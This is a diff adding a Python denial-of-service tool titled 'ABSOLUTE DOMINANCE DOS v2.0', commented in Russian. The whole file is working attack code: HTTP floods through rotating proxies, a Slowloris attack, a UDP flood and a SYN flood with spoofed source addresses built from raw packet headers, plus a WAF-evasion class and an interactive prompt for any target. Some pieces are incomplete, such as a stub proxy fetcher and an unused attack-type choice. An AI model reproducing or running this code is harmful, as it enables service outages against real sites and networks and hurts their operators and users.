@@ -1,0 +1,478 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import sys
+import os
+import time
+import random
+import threading
+import socket
+import ssl
+import hashlib
+import base64
+import json
+import urllib.parse
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+import requests
+import socks
+import http.client
+from cryptography.fernet import Fernet
+import colorama
+from colorama import Fore, Back, Style
+
+colorama.init(autoreset=True)
+
+# ============= КРАСНО-ЧЕРНЫЙ ИНТЕРФЕЙС =============
+BANNER = f"""
+{Fore.RED}
+╔═══════════════════════════════════════════════════════════════════════╗
+║  ██████╗ ██████╗ ███████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗╗
+║  ██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║║
+║  ██║  ██║██████╔╝███████╗    ███████║   ██║      ██║   ███████║██║     ███████║║
+║  ██║  ██║██╔══██╗╚════██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║║
+║  ██████╔╝██║  ██║███████║    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║║
+║  ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝║
+║                                                                                   ║
+║  {Fore.BLACK}{Back.RED}                    ABSOLUTE DOMINANCE DOS v2.0                     {Style.RESET_ALL}{Fore.RED}║
+║  {Fore.BLACK}{Back.RED}                   MULTI-VECTOR ATTACK SYSTEM                        {Style.RESET_ALL}{Fore.RED}║
+╚═══════════════════════════════════════════════════════════════════════╝
+{Style.RESET_ALL}
+"""
+
+class CryptoObfuscator:
+    """Криптографическая обфускация трафика"""
+    
+    @staticmethod
+    def generate_key() -> bytes:
+        return Fernet.generate_key()
+    
+    @staticmethod
+    def encrypt_payload(payload: bytes, key: bytes) -> bytes:
+        f = Fernet(key)
+        return f.encrypt(payload)
+    
+    @staticmethod
+    def decrypt_payload(payload: bytes, key: bytes) -> bytes:
+        f = Fernet(key)
+        return f.decrypt(payload)
+
+class ProxyManager:
+    """Продвинутый менеджер прокси с ротацией"""
+    
+    def __init__(self):
+        self.proxies = []
+        self.current_index = 0
+        self.lock = threading.Lock()
+        
+    def load_proxies(self, proxy_file: str = None):
+        """Загрузка прокси из файла или генерация"""
+        if proxy_file and os.path.exists(proxy_file):
+            with open(proxy_file, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line:
+                        self.proxies.append(self._parse_proxy(line))
+        
+        # Добавляем SOCKS5 прокси если нет
+        if len(self.proxies) < 10:
+            self._generate_socks_proxies()
+            
+        print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies")
+    
+    def _parse_proxy(self, proxy_str: str) -> dict:
+        """Парсинг прокси строки"""
+        if proxy_str.startswith('http://'):
+            return {'http': proxy_str, 'https': proxy_str}
+        elif proxy_str.startswith('socks5://'):
+            return {'http': proxy_str, 'https': proxy_str}
+        else:
+            return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
+    
+    def _generate_socks_proxies(self):
+        """Генерация/получение SOCKS5 прокси"""
+        # В реальном скрипте здесь будет получение прокси из различных источников
+        pass
+    
+    def get_proxy(self) -> dict:
+        """Получение случайного прокси с ротацией"""
+        with self.lock:
+            if not self.proxies:
+                return None
+            self.current_index = (self.current_index + 1) % len(self.proxies)
+            return self.proxies[self.current_index]
+
+class PacketGenerator:
+    """Генератор пакетов с обфускацией"""
+    
+    @staticmethod
+    def random_ip() -> str:
+        """Генерация случайного IP"""
+        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+    
+    @staticmethod
+    def random_user_agent() -> str:
+        """Случайный User-Agent"""
+        agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36"
+        ]
+        return random.choice(agents)
+    
+    @staticmethod
+    def generate_http_payload(target: str, method: str = "GET") -> bytes:
+        """Генерация HTTP/HTTPS пакета"""
+        path = f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10,30)))}"
+        headers = [
+            f"{method} {path} HTTP/1.1",
+            f"Host: {target}",
+            f"User-Agent: {PacketGenerator.random_user_agent()}",
+            "Accept: */*",
+            "Accept-Language: en-US,en;q=0.9",
+            "Accept-Encoding: gzip, deflate, br",
+            "Connection: keep-alive",
+            f"X-Forwarded-For: {PacketGenerator.random_ip()}",
+            f"X-Real-IP: {PacketGenerator.random_ip()}",
+            "Cache-Control: no-cache",
+            "Pragma: no-cache"
+        ]
+        
+        # Добавляем случайные заголовки
+        for _ in range(random.randint(3, 8)):
+            headers.append(f"X-{random.randint(1000,9999)}: {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,15)))}")
+        
+        return "\r\n".join(headers).encode() + b"\r\n\r\n"
+    
+    @staticmethod
+    def generate_tcp_packet(target: str, port: int) -> bytes:
+        """Генерация TCP пакета"""
+        payload = os.urandom(random.randint(64, 1024))
+        return payload
+
+class DDOSEngine:
+    """Основной движок DDoS атак"""
+    
+    def __init__(self, target: str, port: int, threads: int = 500, use_proxy: bool = True):
+        self.target = target
+        self.port = port
+        self.threads = threads
+        self.use_proxy = use_proxy
+        self.running = True
+        self.stats = {
+            'sent': 0,
+            'failed': 0,
+            'start_time': datetime.now()
+        }
+        self.lock = threading.Lock()
+        self.proxy_manager = ProxyManager()
+        self.crypto = CryptoObfuscator()
+        self.attack_key = CryptoObfuscator.generate_key()
+        
+    def update_stats(self, success: bool):
+        """Обновление статистики"""
+        with self.lock:
+            if success:
+                self.stats['sent'] += 1
+            else:
+                self.stats['failed'] += 1
+    
+    def print_stats(self):
+        """Вывод статистики"""
+        elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
+        rate = self.stats['sent'] / elapsed if elapsed > 0 else 0
+        
+        print(f"\r{Fore.RED}[{Fore.WHITE}STATS{Fore.RED}] {Fore.WHITE}Sent: {self.stats['sent']} | "
+              f"Failed: {self.stats['failed']} | "
+              f"Rate: {rate:.0f} p/s | "
+              f"Time: {elapsed:.0f}s", end="")
+    
+    def http_flood(self, session_id: int):
+        """HTTP/HTTPS флуд с обходом защиты"""
+        while self.running:
+            try:
+                proxy = self.proxy_manager.get_proxy() if self.use_proxy else None
+                session = requests.Session()
+                
+                if proxy:
+                    session.proxies.update(proxy)
+                
+                # Случайный метод атаки
+                methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
+                method = random.choice(methods)
+                
+                # Генерация параметров запроса
+                params = {}
+                for _ in range(random.randint(5, 20)):
+                    params[''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))] = \
+                        ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(3, 15)))
+                
+                headers = {
+                    'User-Agent': PacketGenerator.random_user_agent(),
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive',
+                    'Cache-Control': 'no-cache',
+                    'X-Forwarded-For': PacketGenerator.random_ip(),
+                    'X-Real-IP': PacketGenerator.random_ip()
+                }
+                
+                url = f"{'https' if self.port == 443 else 'http'}://{self.target}:{self.port}"
+                
+                if method == 'GET':
+                    response = session.get(url, params=params, headers=headers, timeout=2)
+                elif method == 'POST':
+                    data = {'data': os.urandom(random.randint(100, 1000)).hex()}
+                    response = session.post(url, params=params, headers=headers, json=data, timeout=2)
+                else:
+                    response = session.head(url, params=params, headers=headers, timeout=2)
+                
+                self.update_stats(response.status_code < 500)
+                
+            except Exception as e:
+                self.update_stats(False)
+            
+            # Микро-задержка для обхода защиты
+            time.sleep(random.uniform(0.001, 0.01))
+    
+    def slowloris_attack(self, session_id: int):
+        """Slowloris атака - медленное подключение"""
+        sockets = []
+        
+        while self.running:
+            try:
+                # Создание сокета
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(4)
+                
+                if self.port == 443:
+                    context = ssl.create_default_context()
+                    sock = context.wrap_socket(sock, server_hostname=self.target)
+                
+                sock.connect((self.target, self.port))
+                
+                # Отправка частичных заголовков
+                request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
+                request += f"Host: {self.target}\r\n"
+                request += f"User-Agent: {PacketGenerator.random_user_agent()}\r\n"
+                request += "Accept-language: en-US,en\r\n"
+                
+                for _ in range(random.randint(5, 15)):
+                    request += f"X-{random.randint(1000,9999)}: {random.randint(1,5000)}\r\n"
+                    sock.send(request.encode())
+                    time.sleep(random.uniform(5, 15))
+                
+                sock.close()
+                self.update_stats(True)
+                
+            except Exception as e:
+                self.update_stats(False)
+                try:
+                    sock.close()
+                except:
+                    pass
+    
+    def udp_flood(self, session_id: int):
+        """UDP флуд"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        
+        while self.running:
+            try:
+                payload = os.urandom(random.randint(64, 1024))
+                sock.sendto(payload, (self.target, self.port))
+                self.update_stats(True)
+            except:
+                self.update_stats(False)
+    
+    def syn_flood(self, session_id: int):
+        """SYN флуд (требует raw socket)"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            
+            while self.running:
+                try:
+                    # Конструкция TCP SYN пакета
+                    source_ip = PacketGenerator.random_ip()
+                    
+                    # IP заголовок
+                    ip_header = self._build_ip_header(source_ip, self.target)
+                    
+                    # TCP заголовок
+                    tcp_header = self._build_tcp_header()
+                    
+                    packet = ip_header + tcp_header
+                    sock.sendto(packet, (self.target, 0))
+                    self.update_stats(True)
+                    
+                except:
+                    self.update_stats(False)
+                    
+        except PermissionError:
+            print(f"{Fore.RED}[!] Root/Admin required for SYN flood")
+    
+    def _build_ip_header(self, source_ip: str, dest_ip: str) -> bytes:
+        """Построение IP заголовка"""
+        ip_ihl = 5
+        ip_ver = 4
+        ip_tos = 0
+        ip_tot_len = 40
+        ip_id = random.randint(1, 65535)
+        ip_frag_off = 0
+        ip_ttl = 255
+        ip_proto = socket.IPPROTO_TCP
+        ip_check = 0
+        ip_saddr = socket.inet_aton(source_ip)
+        ip_daddr = socket.inet_aton(dest_ip)
+        
+        ip_header = struct.pack('!BBHHHBBH4s4s',
+            (ip_ver << 4) + ip_ihl,
+            ip_tos,
+            ip_tot_len,
+            ip_id,
+            ip_frag_off,
+            ip_ttl,
+            ip_proto,
+            ip_check,
+            ip_saddr,
+            ip_daddr
+        )
+        
+        return ip_header
+    
+    def _build_tcp_header(self) -> bytes:
+        """Построение TCP заголовка"""
+        tcp_source = random.randint(1024, 65535)
+        tcp_dest = self.port
+        tcp_seq = random.randint(0, 4294967295)
+        tcp_ack_seq = 0
+        tcp_doff = 5
+        tcp_flags = 0x02  # SYN
+        tcp_window = socket.htons(5840)
+        tcp_check = 0
+        tcp_urg_ptr = 0
+        
+        tcp_header = struct.pack('!HHLLBBHHH',
+            tcp_source,
+            tcp_dest,
+            tcp_seq,
+            tcp_ack_seq,
+            (tcp_doff << 4) + 0,
+            tcp_flags,
+            tcp_window,
+            tcp_check,
+            tcp_urg_ptr
+        )
+        
+        return tcp_header
+    
+    def start_attack(self):
+        """Запуск атаки"""
+        attack_types = [
+            self.http_flood,
+            self.slowloris_attack,
+            self.udp_flood
+        ]
+        
+        # Добавляем SYN flood только если есть права
+        try:
+            socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            attack_types.append(self.syn_flood)
+        except:
+            pass
+        
+        print(f"{Fore.GREEN}[+] Starting attack on {self.target}:{self.port}")
+        print(f"{Fore.GREEN}[+] Threads: {self.threads}")
+        print(f"{Fore.GREEN}[+] Attack vectors: {len(attack_types)}")
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            for i in range(self.threads):
+                attack_type = random.choice(attack_types)
+                executor.submit(attack_type, i)
+            
+            # Мониторинг статистики
+            while self.running:
+                self.print_stats()
+                time.sleep(1)
+    
+    def stop_attack(self):
+        """Остановка атаки"""
+        self.running = False
+        print(f"\n{Fore.RED}[!] Attack stopped")
+
+class WAFBypass:
+    """Обход WAF и других защит"""
+    
+    @staticmethod
+    def random_case(text: str) -> str:
+        """Случайный регистр"""
+        return ''.join(random.choice([c.upper(), c.lower()]) for c in text)
+    
+    @staticmethod
+    def add_padding(text: str) -> str:
+        """Добавление паддинга"""
+        padding = ''.join(random.choices('/./', k=random.randint(0, 5)))
+        return f"{padding}{text}{padding}"
+    
+    @staticmethod
+    def encode_payload(payload: str) -> str:
+        """Множественное кодирование"""
+        encodings = [
+            lambda x: base64.b64encode(x.encode()).decode(),
+            lambda x: urllib.parse.quote(x),
+            lambda x: x.encode('utf-8').hex()
+        ]
+        return random.choice(encodings)(payload)
+
+def main():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(BANNER)
+    
+    print(f"""
+{Fore.RED}[{Fore.WHITE}1{Fore.RED}] {Fore.WHITE}HTTP/HTTPS Flood (Layer 7)
+{Fore.RED}[{Fore.WHITE}2{Fore.RED}] {Fore.WHITE}Slowloris Attack
+{Fore.RED}[{Fore.WHITE}3{Fore.RED}] {Fore.WHITE}UDP Flood (Layer 4)
+{Fore.RED}[{Fore.WHITE}4{Fore.RED}] {Fore.WHITE}SYN Flood (Layer 3)
+{Fore.RED}[{Fore.WHITE}5{Fore.RED}] {Fore.WHITE}ALL VECTORS (MAX POWER)
+    """)
+    
+    try:
+        target = input(f"{Fore.RED}[?] {Fore.WHITE}Target (domain or IP): ")
+        port = int(input(f"{Fore.RED}[?] {Fore.WHITE}Port (80/443/8080/etc): "))
+        threads = int(input(f"{Fore.RED}[?] {Fore.WHITE}Threads (100-1000): "))
+        attack_type = int(input(f"{Fore.RED}[?] {Fore.WHITE}Attack type (1-5): "))
+        use_proxy = input(f"{Fore.RED}[?] {Fore.WHITE}Use proxies? (y/n): ").lower() == 'y'
+        
+        print(f"\n{Fore.RED}[!] Starting attack in 3 seconds... Press Ctrl+C to stop")
+        time.sleep(3)
+        
+        engine = DDOSEngine(target, port, threads, use_proxy)
+        
+        # Загрузка прокси
+        if use_proxy:
+            proxy_file = input(f"{Fore.RED}[?] {Fore.WHITE}Proxy file path (optional): ")
+            engine.proxy_manager.load_proxies(proxy_file if proxy_file else None)
+        
+        # Запуск атаки
+        attack_thread = threading.Thread(target=engine.start_attack)
+        attack_thread.start()
+        
+        # Ожидание остановки
+        while True:
+            time.sleep(1)
+            
+    except KeyboardInterrupt:
+        print(f"\n{Fore.RED}[!] Stopping attack...")
+        if 'engine' in locals():
+            engine.stop_attack()
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error: {e}")
+    
+    print(f"{Fore.RED}[+] Attack finished")
+
+if __name__ == "__main__":
+    import struct  # Для SYN flood
+    main()
